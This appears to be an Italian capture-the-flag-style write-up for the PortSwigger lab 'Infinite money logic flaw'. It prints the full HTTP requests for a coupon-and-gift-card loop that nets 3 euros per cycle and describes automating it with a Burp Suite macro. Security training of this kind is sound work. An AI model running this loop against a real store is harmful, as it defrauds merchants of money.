@@ -1,0 +1,120 @@
+                 ______________________________________
+
+                    VULNERABILITÀ DI BUSINESS LOGIC
+                  PortSwigger Academy - Soldi Infiniti
+
+                              Esadecimale
+                 ______________________________________
+
+
+Table of Contents
+_________________
+
+1. Challenge
+2. Soluzione
+
+
+1 Challenge
+===========
+
+  Challenge ripresa dai laboratori di `PortSwigger'.
+  ,----
+  | https://portswigger.net/web-security/all-labs
+  `----
+
+  Laboratorio "Infinite money logic flaw"
+  ,----
+  | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
+  `----
+
+  L'obiettivo è comprare un oggetto che costa `1337' euro, partendo da
+  un account con `100' euro.
+
+  Dalla descrizione, login al portale con credenziali
+  ,----
+  | wiener:peter
+  `----
+
+
+2 Soluzione
+===========
+
+  Iscrizione alla newsletter con email arbitraria per ottenere discount
+  code
+  ,----
+  | SIGNUP30
+  `----
+
+  Flusso vulnerabile che permette di generare 3 euro.
+
+  - Aggiungere Gift Card al carrello
+
+    ,----
+    | POST /cart HTTP/2
+    | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+    | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+    | Content-Length: 36
+    | Content-Type: application/x-www-form-urlencoded
+    | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    | 
+    | productId=2&redir=PRODUCT&quantity=1
+    `----
+
+    - Applicare coupon code per abbassare il prezzo
+
+      ,----
+      | POST /cart/coupon HTTP/2
+      | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+      | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+      | Content-Length: 53
+      | Content-Type: application/x-www-form-urlencoded
+      | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+      | 
+      | csrf=qgfncychfYretoS8u1GTLsEJ22ip7ZQt&coupon=SIGNUP30
+      `----
+
+    - Comprare la gift card per 7 euro
+
+      ,----
+      | POST /cart/checkout HTTP/2
+      | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+      | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+      | Content-Length: 37
+      | Content-Type: application/x-www-form-urlencoded
+      | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+      | 
+      | csrf=qgfncychfYretoS8u1GTLsEJ22ip7ZQt
+      `----
+
+    - Confermare il checkout per leggere il valore della gift card
+
+      ,----
+      | GET /cart/order-confirmation?order-confirmed=true HTTP/2
+      | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+      | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+      | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+      | 
+      `----
+
+    - Riuscotere la gift card per aggiungere 10 euro all'account
+
+      ,----
+      | POST /gift-card HTTP/2
+      | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+      | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+      | Content-Length: 58
+      | Content-Type: application/x-www-form-urlencoded
+      | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+      | 
+      | csrf=qgfncychfYretoS8u1GTLsEJ22ip7ZQt&gift-card=Z2j92XRifE
+      `----
+
+  ----------------------------------------------------------------------
+
+  L'idea è quella di definire una macro tramite burpsuite e una regola
+  di sessione in modo da ripetere il flusso descritto il numero di volte
+  necessario per raggiungere i soldi richiesti.
+
+  ,----
+  | (1337 - 100)/3 = 410
+  `----
